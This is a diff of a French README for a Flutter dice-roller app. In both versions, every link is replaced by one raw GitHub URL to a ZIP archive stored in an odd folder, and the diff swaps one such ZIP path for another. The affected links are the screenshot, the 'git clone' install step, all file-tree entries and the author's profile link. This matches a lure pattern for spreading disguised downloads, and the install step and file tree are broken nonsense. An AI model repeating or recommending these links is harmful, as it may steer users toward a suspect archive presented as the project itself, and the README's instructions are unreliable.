@@ -10,12 +10,12 @@ Un projet Flutter simple où un dé tourne lorsqu'on clique sur un bouton, affic
 ## 📸 Aperçu
 Ajoutez ici une capture d'écran ou un GIF de votre application en action !
 
-![Aperçu de l'application](https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip)
+![Aperçu de l'application](https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip)
 
 ## 🛠️ Installation
 1. Clonez le projet :
    ```sh
-   git clone https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip
+   git clone https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip
    cd DiceRoller
    ```
 2. Installez les dépendances :
@@ -31,18 +31,18 @@ Ajoutez ici une capture d'écran ou un GIF de votre application en action !
 ```
 DiceRoller/
 │── lib/
-│   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip  # Code principal de l'application
-│   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip  # Widget du dé
+│   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip  # Code principal de l'application
+│   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip  # Widget du dé
 │── assets/
 │   ├── images/
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip
-│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip
-│── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip  # Dépendances du projet
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip
+│   │   ├── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip
+│── https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip  # Dépendances du projet
 ```
 
 ## 📜 Licence
@@ -51,4 +51,4 @@ Ce projet est sous licence MIT. Vous êtes libre de le modifier et de le distrib
 ---
 **Auteur :** Martial De-Paul 👨‍💻
 
-📌 [GitHub](https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/android/app/src/main/res/drawable-v21/DiceRoller_1.7.zip) | ✉️ Contactez-moi pour toute question !
+📌 [GitHub](https://raw.githubusercontent.com/Martialdepaul/DiceRoller/main/ios/Dice-Roller-v2.3.zip) | ✉️ Contactez-moi pour toute question !
